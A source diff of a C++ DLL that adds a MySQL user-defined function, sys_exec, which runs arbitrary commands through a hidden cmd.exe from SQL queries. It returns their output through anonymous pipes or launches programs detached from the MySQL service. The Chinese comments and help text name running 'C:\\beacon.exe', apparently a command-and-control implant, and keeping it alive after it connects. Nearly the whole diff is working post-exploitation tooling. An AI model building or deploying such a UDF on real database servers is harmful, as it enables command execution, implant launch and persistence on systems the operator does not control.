@@ -1,11 +1,8 @@
 ﻿#pragma once
 #include "stdio.h"
-#include <winsock.h>
 #include <Urlmon.h>
 #include "mysql.h"
-#include "unlocker.hpp"
-#include <cstdlib>
-#include <comdef.h>
+#include <strsafe.h>
 #pragma comment(lib, "Urlmon.lib")
 HANDLE g_module;
 class ThreadParams
@@ -103,192 +100,178 @@ extern "C" __declspec(dllexport)my_bool sys_exec_init(MSXU_INIT * initid, MSXU_A
 extern "C" __declspec(dllexport)char* sys_exec(MSXU_INIT * initid, MSXU_ARGS * args,
     char* result, unsigned long* length, char* is_null, char* error)
 {
+    BOOL Isoutput = NULL;
+    // 返回信息
+    char* err = "[-] Malloc ERROR\n";
+    size_t lenptr = 1000;
+    initid->ptr = (char*)calloc(lenptr, sizeof(char));
+    if (initid->ptr == NULL) {
+        // 内存分配失败
+        return err;
+    }
 
-    /*  当前代码页（936），如果命令执行显示乱码，可将mysql链接编码也设置为936 */
-   /* 
-    INT Acp =  GetACP();
-    char str[80];
-    sprintf(str, "%08d", Acp);
-    initid->ptr = (char*)malloc(200);
-    if (initid->ptr == NULL)return NULL;
-    strcpy_s(initid->ptr, 200, str);
-    *length = (size_t)strlen(initid->ptr);
-    return initid->ptr;
-    */
+    //1. sys_exec("whoami","1")  回显 whoami 命令结果(** 如果执行通过获得回显方式执行beacon等持续性进程会导致句柄无法回收，mysql 服务无法停止)
+    //2. sys_exec("C:\\beacon.exe","x")  执行beacon不需要回显
+    
+    //TIPS:匿名管道获取回显的方法会导致返回数据比较大的命令如tasklist卡住(https://stackoverflow.com/questions/23502823/no-output-while-trying-to-redirect-cmd-exe-stdout )，也不要使用该方法读取大文件内容。
 
-    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT || _stricmp(args->args[0], "help") == 0)
-    {
-        initid->ptr = (char*)malloc(200);
-        if (initid->ptr == NULL)return NULL;
-        strcpy_s(initid->ptr, 200, "select sys_exec(\"dir c:\\\\\"); select sys_exec(\"powershell -x-x\"); ");
-        *length = (size_t)strlen(initid->ptr);
+    if (args->arg_count != 2 || args->arg_type[0] != STRING_RESULT || args->arg_type[1] != STRING_RESULT || lstrcmpiA(args->args[0], "help") == 0) {
+        StringCchPrintf(initid->ptr, lenptr, "%s", "Help\t1.GetReturn: select sys_exec(\"whoami\",\"1\");2.NoReturn: select sys_exec(\"C:\\beacon.exe\",\"any\"); ");
+        *length = lenptr;
         return initid->ptr;
     }
-    int Sta = 0;
-    char* cmdline;
-    char temp_path[MAX_PATH] = { 0 };
-    char cmd_path[MAX_PATH] = { 0 };
-    char runtemp[150] = { 0 };
-    DWORD size = 0, len = 0;
-    HANDLE hFile;
-    GetSystemDirectory(cmd_path, MAX_PATH - 1);
-    strcat_s(cmd_path, strlen(cmd_path) + strlen("\\cmd.exe") + 1, "\\cmd.exe");
-    GetEnvironmentVariable("temp", temp_path, MAX_PATH - 1);
-    strcat_s(temp_path, strlen(temp_path) + strlen("\\8b4b6978-ea13-49d6-b4db-1990a796229d") + 1, "\\8b4b6978-ea13-49d6-b4db-1990a796229d");
+    
+    if (lstrcmpiA((LPCSTR)(args->args[1]), "1") == 0) {
+        Isoutput = TRUE;
+    }
 
-    size_t size_cmdline = strlen(args->args[0]) + strlen(temp_path) + 50;
-    cmdline = (char*)malloc(size_cmdline);
-    if (cmdline == NULL) return NULL;
-    strcpy_s(cmdline, strlen(cmdline) + strlen(",/c,") + 1, ",/c,");
-    strcat_s(cmdline, strlen(cmdline) + strlen(args->args[0]) + 1, (args->args[0]));
+    ///
+    /// 匿名管道
+    /// 
+    BOOL rt = TRUE;
+    BOOL TIMEOUT = FALSE;
+    BOOL FAILED = FALSE;
 
-    //strcat_s(cmdline, strlen(cmdline) + strlen(" >> ") + 1, " >> ");
-   // strcat_s(cmdline, strlen(cmdline) + strlen(temp_path) + 1, temp_path);
-   // strcat_s(cmdline, strlen(cmdline) + strlen(" 2>&1") + 1, " 2>&1");
+    char Buffer[4096] = { 0 };
+    STARTUPINFO sInfo;//新进程的主窗口特性
+    GetStartupInfo(&sInfo); // ZeroMemory(&sInfo, sizeof(sInfo));
+    sInfo.cb = sizeof(sInfo);
+    sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    sInfo.wShowWindow = SW_HIDE;
 
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    ZeroMemory(&pi, sizeof(pi));
-    si.wShowWindow = SW_HIDE;
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES),NULL,TRUE };
+    PROCESS_INFORMATION pInfo;
+    ZeroMemory(&pInfo, sizeof(pInfo));
 
+    DWORD bytesRead = 0;    //读取代码的长度
+    SECURITY_ATTRIBUTES sa;
+    HANDLE hRead = NULL;
+    HANDLE hWrite = NULL;
 
-    // 检查文件
-    hFile = CreateFile(temp_path, // PipeName 
-        GENERIC_READ | GENERIC_WRITE, // 可读可写
-        FILE_SHARE_READ, // 共享权限，可以不用重新获得句柄一直使用该句柄直到关闭，尝试解决beacon上线后占用了文件,无法继续执行命令的bug
-        &sa,                          // _SECURITY_ATTRIBUTES.bInheritHandle = TRUE ,子进程可继承句柄
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_ARCHIVE,                            // 默认属性
-        NULL);
-    if (hFile != INVALID_HANDLE_VALUE){}
-    else {
-        // 如果是占用状态就删除该文件！！
-        if (GetLastError() == 32) {
-            _bstr_t _b_path(temp_path);
-            const WCHAR* wc_path = _b_path;
-            unlocker::File* file = unlocker::Path::Exists(temp_path);
-            if (file) {
-                file->Unlock();
-                delete file;
+    // 需要输出才创建匿名管道
+    if (Isoutput) {
+        sa.nLength = sizeof(SECURITY_ATTRIBUTES); //结构体的大小，可用SIZEOF取得
+        sa.lpSecurityDescriptor = NULL;//安全描述符
+        sa.bInheritHandle = TRUE;; //安全描述的对象能否被新创建的进程继承
+        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) //创建匿名管道，用于有亲缘关系的进程，能拿到管道句柄的
+        {
+            StringCchPrintf(initid->ptr, lenptr, "[-] Error:%d\n", GetLastError());
+            *length = lenptr;
+            return initid->ptr;
+        }
+        sInfo.hStdError = hWrite;   
+        sInfo.hStdOutput = hWrite;//子进程的输出到匿名管道Write端
+    }
+
+    // 拼接命令行
+    char cmdline[MAX_PATH] = { 0 }, ShellPath[MAX_PATH] = { 0 }, AppName[MAX_PATH] = { 0 };
+    GetSystemDirectoryA(ShellPath, MAX_PATH - 1);
+    // StringCchCatA(ShellPath, MAX_PATH, getenv("TEMP"));
+    HRESULT hr_1 = StringCchPrintfA(AppName, MAX_PATH, "%s%s", ShellPath, "\\cmd.exe");
+    HRESULT hr_2 = StringCchPrintfA(cmdline, MAX_PATH, " /c %s",args->args[0]);
+    if (SUCCEEDED(hr_1) && SUCCEEDED(hr_2)) {
+        if (!CreateProcessA(AppName, cmdline, NULL, NULL, Isoutput, 0, NULL, ShellPath, &sInfo, &pInfo)) //创建子进程
+        {
+            if (hWrite != NULL) { CloseHandle(hWrite); }
+            if (hRead != NULL) { CloseHandle(hRead); }
+            StringCchPrintf(initid->ptr, lenptr, "[-]Run cmdline: %s%s,CreateProcess Error:%d\n", ShellPath, cmdline,GetLastError());
+            *length = lenptr;
+            return initid->ptr;
+        }
+
+        //需要输出的情况下
+        if (Isoutput) {
+            DWORD sign = WaitForSingleObject(pInfo.hProcess, 10000);
+            switch (sign)
+            {
+                case WAIT_TIMEOUT: {
+                    StringCchPrintf(initid->ptr, lenptr, "%s Errorcode:%d.\n", "[-] WaitForSingleObject CreateProcess TIMEOUT.", GetLastError());
+                    TIMEOUT = TRUE;
+                    break;
+                }
+                case WAIT_FAILED:
+                {
+                    StringCchPrintf(initid->ptr, lenptr, "%s Errorcode:%d.\n", "[-] WaitForSingleObject WAIT_FAILED.", GetLastError());
+                    FAILED = TRUE;
+                    break;
+                }
+                case WAIT_ABANDONED:
+                {
+                    StringCchPrintf(initid->ptr, lenptr, "%s Errorcode:%d.\n", "[-] WaitForSingleObject WAIT_ABANDONED.", GetLastError());
+                    FAILED = TRUE;
+                    break;
+                }
+                case WAIT_OBJECT_0: {
+                    StringCchPrintf(initid->ptr, lenptr, "%s\n", "[*] WAIT_OBJECT_0");
+                    break;
+                }
+                default: {
+                    break;
+                }
+            }
+            CloseHandle(hWrite); //关闭父进程的写端，在渎之前关闭该句柄
+            if (TIMEOUT || FAILED) {
+                // 异常时关闭进程，返回错误信息。
+                TerminateProcess(pInfo.hProcess, 0);
+                if (hRead != NULL) { CloseHandle(hRead); }
+                if (pInfo.hThread) { CloseHandle(pInfo.hThread); }
+                if (pInfo.hProcess) { CloseHandle(pInfo.hProcess); }
+                *length = lenptr;
+                return initid->ptr;
+            }
+            else {
+                // 子进程正常返回数据
+                while (ReadFile(hRead, Buffer, sizeof(Buffer) - 1, &bytesRead, NULL) != FALSE)
+                {
+                    /* add terminating zero */
+                    Buffer[bytesRead] = '\0';
+                    /* do something with data in buffer */
+                    if (strlen(Buffer) < 3) {
+                        continue;
+                    }
+                    else {
+                        // 匹配最后两个字符串，如果是 \r\n 换行就截断
+                        if (lstrcmpiA(&(Buffer[strlen(Buffer) - 2]), const_cast<char*>("\r\n")) == 0) {
+                            Buffer[strlen(Buffer) - 2] = '\0';
+                        }
+                    }
+                }
+                
+                if (strlen(Buffer) > 1) {
+                    if (strlen(Buffer) > lenptr) {
+                        lenptr = strlen(Buffer);
+                        initid->ptr = (char*)realloc(initid->ptr, lenptr);
+                        ZeroMemory(initid->ptr, lenptr);
+                    }
+                    StringCchPrintf(initid->ptr, lenptr, "%s", Buffer);
+                }
+                else {
+                    StringCchPrintf(initid->ptr, lenptr, "%s", "[-] No output.\n");
+                }
             }
         }
-    }
-    CloseHandle(hFile);
-
-    hFile = CreateFile(temp_path, // PipeName 
-        GENERIC_READ | GENERIC_WRITE, // 可读可写
-        FILE_SHARE_READ , // 共享权限，可以不用重新获得句柄一直使用该句柄直到关闭，尝试解决beacon上线后占用了文件,无法继续执行命令的bug
-        &sa,                          // _SECURITY_ATTRIBUTES.bInheritHandle = TRUE ,子进程可继承句柄
-        CREATE_ALWAYS,                
-        FILE_ATTRIBUTE_ARCHIVE,                            // 默认属性
-        NULL);
-
-    if (hFile != INVALID_HANDLE_VALUE)
-    {
-        // CreateProcess 输出重定向到管道
-        si.hStdInput = NULL;
-        si.hStdError = hFile;
-        si.hStdOutput = hFile;
-
-        Sta = CreateProcess(cmd_path, cmdline, NULL, NULL, TRUE, 0, 0, 0, &si, &pi);
-        free(cmdline);
-        size_t tsize = 1 * sizeof runtemp;
-        if (!Sta)
-        {
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            sprintf_s(runtemp, tsize, "[-]ErrorCode:%d \n", GetLastError());
-            initid->ptr = (char*)malloc(tsize);
-            if (initid->ptr == NULL) return NULL;
-            strcpy_s(initid->ptr, tsize, runtemp);
-            (*length) = (size_t)strlen(initid->ptr);
-            return initid->ptr;
-        }
-
-        DWORD signWaitruncmd = WaitForSingleObject(pi.hProcess, 3000);
-        if (WAIT_FAILED == signWaitruncmd) {
-            TerminateProcess(pi.hProcess, 0);
-            CloseHandle(hFile);  // 解除文件占用
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            DeleteFile(temp_path);
-            sprintf_s(runtemp, tsize, "%s", "[-]WaitForSingleObject WAIT_FAILED Failed.\n");
-            initid->ptr = (char*)malloc(tsize + 1);
-            if (initid->ptr == NULL) return NULL;
-            strcpy_s(initid->ptr, tsize, runtemp);
-            (*length) = (size_t)strlen(initid->ptr);
-            return initid->ptr;
-        }
-        else if (WAIT_TIMEOUT == signWaitruncmd) {
-            TerminateProcess(pi.hProcess, 0); // 把cmd /c 关闭
-            CloseHandle(hFile);  // 解除文件占用
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            DeleteFile(temp_path);
-            sprintf_s(runtemp, tsize, "%s", "[-]WaitForSingleObject TIMEOUT.\n");
-            initid->ptr = (char*)malloc(tsize + 1);
-            if (initid->ptr == NULL) return NULL;
-            strcpy_s(initid->ptr, tsize, runtemp);
-            (*length) = (size_t)strlen(initid->ptr);
-            return initid->ptr;
-        }
         else {
-          //  TerminateProcess(pi.hProcess, 0);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            CloseHandle(hFile);  // 解除文件占用
+            // 等待一下进程初始化完成，最多2s
+            WaitForSingleObject(pInfo.hProcess,2000);
+            // 执行其他不回显的进程结束后，把 cmd /c 结束，让进程独立于mysql进程之外
+            // 如果执行的程序导致cmd /c 挂起，会导致服务也挂起(停止服务会失败)，需要指定不能回显的程序不继承
+            char RunFileName[MAX_PATH] = {0};
+            DWORD pSize = MAX_PATH;
+            DWORD exitCode = 0;
+            // GetProcessImageFileNameA(pInfo.hProcess, RunFileName, MAX_PATH);
+            QueryFullProcessImageNameA(pInfo.hProcess,0, RunFileName, &pSize);
+            TerminateProcess(pInfo.hProcess, 0); // 把cmd /c 关闭
+            GetExitCodeProcess(pInfo.hProcess, &exitCode);
+            StringCchPrintf(initid->ptr, lenptr, "[*] CreateProcess(%s) ProcessId:%d,ThreadId:%d,exitCode:%d,Error:%d\n", RunFileName, pInfo.dwProcessId, pInfo.dwThreadId, exitCode,GetLastError());
         }
+        if (hRead != NULL) { CloseHandle(hRead); }
+        if (pInfo.hThread) { CloseHandle(pInfo.hThread); }
+        if (pInfo.hProcess) { CloseHandle(pInfo.hProcess); }
     }
     else {
-            initid->ptr = (char*)malloc(200);
-            if (initid->ptr == NULL)return NULL;
-            sprintf_s(initid->ptr, 200, "[-]CreateFile error:%d", GetLastError());
-            *length = (size_t)strlen(initid->ptr);
-            return initid->ptr;
+        StringCchPrintf(initid->ptr, lenptr, "[-] Error:%d\n", GetLastError());   
     }
-
-
-    hFile = CreateFile(temp_path, GENERIC_READ, FILE_SHARE_READ, NULL,
-        OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
-
-    if (hFile != INVALID_HANDLE_VALUE)
-    {
-        size = GetFileSize(hFile, NULL);
-        if (size < 2) {
-            CloseHandle(hFile);
-            initid->ptr = (char*)malloc(100);
-            if (initid->ptr == NULL) return NULL;
-            strcpy_s(initid->ptr, 100, "[-]Command failed GetFileSize: 0");
-            (*length) = (size_t)strlen(initid->ptr);
-            return initid->ptr;
-        }
-        initid->ptr = (char*)malloc((size_t)(size)+100); // if size = 0, +100
-        if (initid->ptr == NULL) { CloseHandle(hFile);  return NULL; }
-        BOOL bResult = ReadFile(hFile, initid->ptr, size + 1, &len, NULL);
-        CloseHandle(hFile);
-        DeleteFile(temp_path);
-        if (bResult && (len == size)) {
-            (initid->ptr)[size - 1] = '\0';
-        }
-        else {
-            sprintf_s(initid->ptr, 100, "[-]ReadFile error:%d", GetLastError());
-            (*length) = (size_t)strlen(initid->ptr);
-            return initid->ptr;
-        }
-    }
-    else
-    {
-        initid->ptr = (char*)malloc(100);
-        if (initid->ptr == NULL) return NULL;
-        sprintf_s(initid->ptr, 100, "[-]CreateFile error:%d", GetLastError());
-    }
-    (*length) = (size_t)strlen(initid->ptr);
+    *length = lenptr;
     return initid->ptr;
-
 }
 extern "C" __declspec(dllexport)void sys_exec_deinit(MSXU_INIT * initid)
 {
